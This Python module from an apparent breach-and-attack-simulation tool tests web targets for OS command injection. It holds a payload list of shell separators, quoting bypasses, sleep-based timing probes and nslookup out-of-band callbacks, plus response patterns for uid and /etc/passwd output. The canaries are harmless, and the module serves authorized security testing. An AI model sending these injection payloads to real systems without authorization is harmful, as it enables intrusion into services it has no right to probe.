"""
Command Injection testing module.

Tests for OS command injection via various separators and encoding bypasses.

MITRE ATT&CK: T1059 - Command and Scripting Interpreter
"""

from __future__ import annotations

import re
import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Canary command that produces identifiable output without side effects
CANARY_COMMAND = "echo BAS_CMDI_{canary}"
CANARY_WIN_COMMAND = "echo BAS_CMDI_{canary}"

DEFAULT_CMDI_PAYLOADS = [
    # Unix separators
    "; echo BAS_CMDI_{canary}",
    "| echo BAS_CMDI_{canary}",
    "|| echo BAS_CMDI_{canary}",
    "&& echo BAS_CMDI_{canary}",
    "& echo BAS_CMDI_{canary}",
    "` echo BAS_CMDI_{canary}`",
    "$(echo BAS_CMDI_{canary})",
    # Newline-based
    "%0aecho BAS_CMDI_{canary}",
    "%0d%0aecho BAS_CMDI_{canary}",
    "\necho BAS_CMDI_{canary}",
    # Quoting bypasses
    "';echo BAS_CMDI_{canary};'",
    '";echo BAS_CMDI_{canary};"',
    # Windows
    "& echo BAS_CMDI_{canary}&",
    "| echo BAS_CMDI_{canary}|",
    # Time-based detection
    "; sleep 5",
    "| sleep 5",
    "& timeout /t 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Out-of-band (if DNS callback configured)
    "; nslookup {oob_domain}",
    "| nslookup {oob_domain}",
    "$(nslookup {oob_domain})",
]


class CommandInjectionModule(BaseAttackModule):
    """OS Command Injection testing module."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="command_injection",
            description="OS Command Injection testing via separators, encoding, and time-based detection",
            category="cmdi",
            mitre_technique_ids=["T1059"],
            mitre_technique_names=["Command and Scripting Interpreter"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-78"],
            tags=["injection", "rce", "command"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        canary = uuid.uuid4().hex[:8]
        options["_canary"] = canary
        oob_domain = options.get("oob_domain", "bas.internal.test")

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("cmdi", limit=100)
            if db_payloads:
                return [p.replace("{canary}", canary).replace("{oob_domain}", oob_domain) for p in db_payloads]

        return [p.replace("{canary}", canary).replace("{oob_domain}", oob_domain) for p in DEFAULT_CMDI_PAYLOADS]

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", ["cmd", "exec", "command", "ping", "query", "host", "ip", "file"])
        path = options.get("path", "/")

        for payload in payloads:
            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                canary = options.get("_canary", "")
                requests.append(AttackRequest(
                    request_id=f"cmdi-{req_id}",
                    target=target,
                    method=options.get("method", "GET"),
                    path=path,
                    params={param: payload} if options.get("method", "GET") == "GET" else {},
                    body=urlencode({param: payload}) if options.get("method", "GET") != "GET" else None,
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Canary": canary},
                    timeout=options.get("timeout", 15.0),
                ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        canary = request.headers.get("X-BAS-Canary", "")

        # Canary-based detection
        if canary and f"BAS_CMDI_{canary}" in body:
            return ModuleResult(
                module_name="command_injection",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Command injection confirmed: canary 'BAS_CMDI_{canary}' found in response",
                severity="critical",
                mitre_technique_id="T1059",
                detail={"detection_type": "canary_reflected"},
            )

        # OS fingerprints from command output
        os_indicators = [
            (r"uid=\d+\(", "Unix uid output detected"),
            (r"root:x:0:0", "/etc/passwd content detected"),
            (r"Directory of [A-Z]:\\", "Windows dir output detected"),
            (r"Volume Serial Number", "Windows volume info detected"),
            (r"/bin/(ba)?sh", "Shell path detected"),
        ]
        for pattern, desc in os_indicators:
            if re.search(pattern, body, re.IGNORECASE):
                return ModuleResult(
                    module_name="command_injection",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Command injection: {desc}",
                    severity="critical",
                    mitre_technique_id="T1059",
                    detail={"detection_type": "os_fingerprint"},
                )

        # Time-based detection
        if "sleep" in payload.lower() or "timeout" in payload.lower():
            if response.elapsed_ms > 4500:
                return ModuleResult(
                    module_name="command_injection",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Time-based command injection: {response.elapsed_ms:.0f}ms delay",
                    severity="critical",
                    mitre_technique_id="T1059",
                    detail={"detection_type": "time_based"},
                )

        return ModuleResult(
            module_name="command_injection",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
